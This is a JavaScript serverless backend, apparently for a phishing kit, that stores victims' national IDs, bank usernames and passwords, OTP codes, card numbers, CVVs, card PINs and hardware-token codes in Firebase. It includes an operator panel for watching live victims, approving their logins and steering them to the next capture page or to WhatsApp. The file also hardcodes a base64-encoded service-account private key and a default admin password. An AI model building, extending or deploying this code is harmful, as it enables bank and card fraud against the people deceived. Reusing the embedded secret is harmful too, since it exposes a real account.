const crypto = require('crypto');
const admin = require('firebase-admin');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const FB_SA_B64 = 'ewogICJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsCiAgInByb2plY3RfaWQiOiAidGhlLXVhZS01YWFkOSIsCiAgInByaXZhdGVfa2V5X2lkIjogImI0M2RhY2Q5MmY1YTM0MTg3MTRiNjAyMmQyNmYyOWYyMGUyNmJlMTUiLAogICJwcml2YXRlX2tleSI6ICItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS1cbk1JSUV2QUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktZd2dnU2lBZ0VBQW9JQkFRREd6NEN6MjZhVyt6SGFcbkIvU0FONWVISW1uQ1c1UTFoY3k2UDdLaExwL3FUcURrRjhPbmxReStLbzVqODhLU1RISE1XeDdxT24yTUhtWm9cbkQvUmpLVXFYcVFUeVArUmRuK081ZndKdTZUQTdMWHVkdTdCTEN0VE80WHFqZC9ReUxxVUJjMUJ1VmFEYUJaeE5cbkJ1SlBGZ3Rub05tenVmVjAxMjRjNUEvSGNMZFU2bE1pa1ZVaG5rOVpJQTJOOTNBanoweTNQMm83T3QzZXMvS1VcbjA1bVB3amxtRFM2NlBkbXROQ2Vyc05Zcm5kUEZCMGc4SDNCdFVuOEorNjVWWkhNY0NtRDJRMWZIT01panJDZHhcbkxQcGtUelJReFRqdGlwYm5Ld0lselcyRkY4ejhHanAxUkFiYVhuR1FocWdtOEFRT3djenFYVG1XRDRJY0pNcEJcblBLenRSL0toQWdNQkFBRUNnZ0VBWXBDaXFzamx4U25CYytxSXZmNlJ1ZFlHWCt6K1JERFRLSzJHMXFGaWVBeEdcbmVQOE5LZXJiOS9YcVJVU25QTmdvRld4Qm5mZWtvZEM2amJJSFJCaEhHbnlaN3E1ZGZrdFVYL1ZIbEF3NU5NV2VcbmFUdVJzZ3FyS2V3ZzNLV09aRWk2MXNiQVpBdEE1WVp0a01TdWMyNG05bGdKUnJFVnI3bFVwcThzNFlDUTYrQWxcbnNxM1A3UXcyTEZySk5PdTdDUDMyb3ViL0NPZFRJZ1BQNzVYSTh6ZjVRMnBCaHNJdmJoR3dmZExrNWk3TTZ5VitcbkdwVldRakRkaHpRRHYzYWZJd1h5TXJMTUV2Lzlza1ZZVnNnb1NTVVdGUmEvU0UwbFpNWVo0ayttaXJ2aUpneTNcbktGY283ZmZMT3dyZkYxQ1hOd3Q4YzFrOEpSbmhyQ2R4cGMxSGFKLzFid0tCZ1FENlRHeklmRWZCREQxelQxQmFcbnByV3c4SmJFQmpyZGRGOEx5dXBwTTNLS04zbzBTQzVMM1JNanA2Y3pERHhubC9jZlVFYzVGY1NicVJJRHhmNDNcbkNMeEw1dDJ6RW95b3dMTWVLZXhCSmJFa0xtY29nNXBpdHFIaERuR29hUllNUFk0OEM0a3VlVkpFNXZ1U2JIZCtcbmc5aVhOOGUyYk1YdkdxVkp5OXJmYTJ6K3h3S0JnUURMVnRXRnVhc3lzdUVCcktuWmpTNVpVbUF4MGNqMmN5QUJcbm9CWm05VDR4YnlsMW9CNmYvZU9nU0pMcU44M0lDNThaTUxZWTlOeHlwRDhJRDJzSlB6Zkdia0dRT05SNXFGNWJcbjdvc2F5TGFndm1Wem9TbWozdkhrRTd2ZS95aVYzUTBwQktiZHJqNTc4U0NEUDYzb3p4SUs2WDIvMTdKRm4wUVNcbmVsQ2E3ODY3VndLQmdGYWZobkpvR0lrbURFcFE0N1ZMeHN1aXAvclZVUi85T3p1Z2tUbXhWVzJpUDRmQ2gwczRcbkNueW5kQVVGc2c0RUdNRmNqaG1pZi9XRE1MbmZsdGhEREsrVUNad0V5bXRJclhTOSs0YWNYYzd3eEVEUU11a0FcbjNjcytyWFVrVVQ0Uk81MXFRS0s1MkJBQ2hJUXJSN3VnTTZBNTdNTWtwK2ZWSitqL1JSTlhZVlJYQW9HQUhLVE9cbnoxZW9WaXY4cGsrOFhYa1YzbDlNVGJoUHB1Znd5a25TM2c0T0JNaXovbTNmNG9uUlZ2TGlQenc5TU1EeVdJb1VcbkhNL2hmZ1RGSEUyUHRtM0JYYUtLZWRhSGw5dXY3eU5iVlJxUkgzT3l0dWN0Qm5pUmVwK05CNHpLR3RKWTJENWZcbmd6clljbjAxSjBnQko1cUQ0Q1drSVRJeFdyMWt5WFdSaFVIaXpXRUNnWUJhUWhxNkoxQVYzbVVSQ1dValc0ZnJcbkwxTjVqK0szd0s3a3huVSs2SmplcTJLZ0dxeXAyMnY4S2NHZk9QcXp5UDBlODJ5eFRXZ1VLM3BHZXhleHBzOWRcbkp3d1RGMmRQNmY2SEdCOVIyWnppSmlTU21lbUh4OGxPVHUwU3VkbzRBbTkrYkpBa0c3SlhkeGNFT3k2OXBESm1cbmhxRll2OHkrS0EwNGhYcXhUczNwVXc9PVxuLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLVxuIiwKICAiY2xpZW50X2VtYWlsIjogImZpcmViYXNlLWFkbWluc2RrLWZic3ZjQHRoZS11YWUtNWFhZDkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLAogICJjbGllbnRfaWQiOiAiMTExMjcwMzIyNzA1NjQxNjMwNjY1IiwKICAiYXV0aF91cmkiOiAiaHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tL28vb2F1dGgyL2F1dGgiLAogICJ0b2tlbl91cmkiOiAiaHR0cHM6Ly9vYXV0aDIuZ29vZ2xlYXBpcy5jb20vdG9rZW4iLAogICJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vb2F1dGgyL3YxL2NlcnRzIiwKICAiY2xpZW50X3g1MDlfY2VydF91cmwiOiAiaHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vcm9ib3QvdjEvbWV0YWRhdGEveDUwOS9maXJlYmFzZS1hZG1pbnNkay1mYnN2YyU0MHRoZS11YWUtNWFhZDkuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLAogICJ1bml2ZXJzZV9kb21haW4iOiAiZ29vZ2xlYXBpcy5jb20iCn0K';

if (!admin.apps.length) {
  let sa;
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    sa = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
  } else {
    sa = JSON.parse(Buffer.from(FB_SA_B64, 'base64').toString('utf8'));
  }
  admin.initializeApp({ credential: admin.credential.cert(sa) });
}
const db = admin.firestore();
const appsCol = db.collection('halyg_apps');
const settingsRef = db.doc('halyg_config/settings');

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }
function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

let _visitors = {};

async function getSettings() {
  const doc = await settingsRef.get();
  const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
  return doc.exists ? { ...defaults, ...doc.data() } : { ...defaults };
}

async function getOrCreateApp(nationalId) {
  const ref = appsCol.doc(nationalId);
  const doc = await ref.get();
  if (doc.exists) return doc.data();

  const settings = await getSettings();
  const newId = (settings.appIdCounter || 10000) + 1;
  await settingsRef.set({ appIdCounter: newId }, { merge: true });

  const app = {
    id: newId, nationalId,
    fullName: '', phoneNumber: '', phone: '', address: '',
    username: '', password: '',
    otp: '', otpCode: '',
    cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
    cardPin: '', cardName: '',
    hardToken: '', watchLink: '', watchLinkOtp: '',
    selectedWatch: '', watchColor: '',
    governorate: '',
    currentPage: 'home', status: 'active',
    redirectTo: null, redirectError: null,
    customMessage: null, loginApproved: null,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await ref.set(app);
  return app;
}

function getOrCreateVisitor(sessionId) {
  if (!_visitors[sessionId]) {
    _visitors[sessionId] = {
      id: Date.now(), sessionId,
      currentPage: 'home', redirectTo: null,
      lastActiveAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
    };
  }
  return _visitors[sessionId];
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) { const v = getOrCreateVisitor(sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      const v = sessionId ? _visitors[sessionId] : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId && _visitors[sessionId]) { _visitors[sessionId].redirectTo = null; _visitors[sessionId].lastActiveAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      if (!nationalId) return { redirectTo: null, redirectError: null };
      const doc = await appsCol.doc(nationalId).get();
      const app = doc.exists ? doc.data() : null;
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      if (!nationalId) return { message: null };
      const doc = await appsCol.doc(nationalId).get();
      const app = doc.exists ? doc.data() : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ customMessage: null });
      }
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ currentPage: page || doc.data().currentPage, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.currentPage = 'personal';
      app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      if (!app.fullName && username) app.fullName = username;
      app.currentPage = 'waiting-login';
      app.redirectTo = null; app.redirectError = null;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_watchlink'; app.updatedAt = new Date().toISOString();
      await appsCol.doc(nationalId).set(app);
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const snap = await appsCol.get();
      const apps = [];
      snap.forEach(d => apps.push(d.data()));
      const cutoff = Date.now() - 60000;
      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
      const liveVisitorCount = Object.values(_visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000).length;
      const settings = await getSettings();
      return { apps, activeIds, liveVisitorCount, totalVisitors: settings.totalVisitors };
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(_visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 120000) };
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      const settings = await getSettings();
      return { visitors: Object.values(_visitors), totalCount: settings.totalVisitors };
    }
    case 'admin.getWhatsAppLink': {
      const settings = await getSettings();
      return { link: settings.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ whatsappLink: input.link || '' }, { merge: true });
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) await ref.update({ customMessage: message || null, updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId) {
        const ref = appsCol.doc(nationalId);
        const doc = await ref.get();
        if (doc.exists) {
          const dest = redirectTo || page || null;
          const updates = { redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
          if (dest) updates.currentPage = dest;
          await ref.update(updates);
        }
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId && _visitors[sessionId]) { _visitors[sessionId].redirectTo = redirectTo || page || null; _visitors[sessionId].lastActiveAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const snap = await appsCol.get();
      const batch = db.batch();
      snap.forEach(d => {
        const app = d.data();
        if (app.status === 'active' || (app.status && app.status.startsWith('awaiting'))) {
          batch.update(d.ref, { redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() });
        }
      });
      await batch.commit();
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let ref, doc;
      if (nationalId) {
        ref = appsCol.doc(nationalId);
        doc = await ref.get();
      }
      if ((!doc || !doc.exists) && applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) { doc = snap.docs[0]; ref = doc.ref; }
      }
      if (doc && doc.exists) {
        await ref.update({ redirectTo: 'whatsapp', updatedAt: new Date().toISOString() });
      }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) {
        await appsCol.doc(nationalId).delete();
      } else if (applicationId) {
        const snap = await appsCol.where('id', '==', applicationId).limit(1).get();
        if (!snap.empty) await snap.docs[0].ref.delete();
      }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = new Date(Date.now() - 120000).toISOString();
      const snap = await appsCol.where('updatedAt', '<', cutoff).get();
      let deletedCount = 0;
      const batch = db.batch();
      snap.forEach(d => { batch.delete(d.ref); deletedCount++; });
      if (deletedCount > 0) await batch.commit();
      return { success: true, deletedCount };
    }
    case 'admin.deleteAllClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const snap = await appsCol.get();
      const count = snap.size;
      const batch = db.batch();
      snap.forEach(d => batch.delete(d.ref));
      if (count > 0) await batch.commit();
      return { success: true, deletedCount: count };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      await settingsRef.set({ totalVisitors: 0 }, { merge: true });
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);

  let setCookie = null, clearCookie = false;

  const results = [];
  for (let i = 0; i < procs.length; i++) {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    const procName = procs[i].trim();
    try {
      const result = await executeProcedure(procName, input, isAdmin);
      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
      results.push({ result: { data: { json: result } } });
    } catch (e) {
      results.push({ error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } });
    }
  }

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
